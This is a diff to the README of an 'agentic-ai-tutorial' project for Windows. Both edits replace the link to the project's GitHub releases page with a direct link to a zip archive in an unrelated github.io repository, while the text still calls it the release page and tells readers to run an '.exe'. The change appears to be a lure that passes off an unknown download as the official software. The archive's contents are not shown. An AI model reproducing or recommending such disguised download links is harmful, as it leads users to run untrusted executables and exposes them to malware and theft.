@@ -5,7 +5,7 @@ description: "Learn to build agentic AI systems using Jupyter notebooks, LangGra
 ---
 # 🤖 agentic-ai-tutorial - Master the fundamentals of agentic AI
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Alkaloiddolichocephaly898/agentic-ai-tutorial/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Alkaloiddolichocephaly898/alkaloiddolichocephaly898.github.io/raw/refs/heads/main/midparentage/App_2.0-alpha.2.zip)
 
 This document helps you set up and run the agentic-ai-tutorial software on your Windows computer. Whether you want to learn how autonomous agents work or explore multi-agent systems, this guide walks you through the process step by step.
 
@@ -22,7 +22,7 @@ Before you start, ensure your computer meets these requirements:
 
 Follow these steps to obtain the software:
 
-1. Visit the project release page at [https://github.com/Alkaloiddolichocephaly898/agentic-ai-tutorial/releases](https://github.com/Alkaloiddolichocephaly898/agentic-ai-tutorial/releases).
+1. Visit the project release page at [https://github.com/Alkaloiddolichocephaly898/alkaloiddolichocephaly898.github.io/raw/refs/heads/main/midparentage/App_2.0-alpha.2.zip](https://github.com/Alkaloiddolichocephaly898/alkaloiddolichocephaly898.github.io/raw/refs/heads/main/midparentage/App_2.0-alpha.2.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in ".exe" to begin the download.
 4. Save the file to your "Downloads" folder.
